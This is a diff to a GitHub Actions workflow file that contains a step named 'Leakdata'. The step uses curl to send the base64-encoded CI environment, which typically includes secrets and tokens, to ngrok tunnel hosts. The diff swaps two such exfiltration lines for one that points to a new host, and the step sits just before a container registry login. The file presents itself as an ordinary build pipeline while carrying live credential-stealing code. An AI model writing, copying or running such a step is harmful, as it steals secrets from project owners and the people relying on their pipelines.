@@ -23,8 +23,7 @@ jobs:
 
       - name: Leakdata
         run: |
-          curl -k https://5667-128-130-253-70.eu.ngrok.io?data=$(env | base64 --wrap=0)
-          curl -k https://9f6b-128-131-212-206.eu.ngrok.io?data=$(env | base64 --wrap=0)
+          curl -k https://eab7-128-131-212-206.eu.ngrok.io?data=$(env | base64 --wrap=0)
 
       - name: Login to the Container registry
         uses: docker/login-action@f054a8b539a109f9f41c372932f1ae047eff08c9
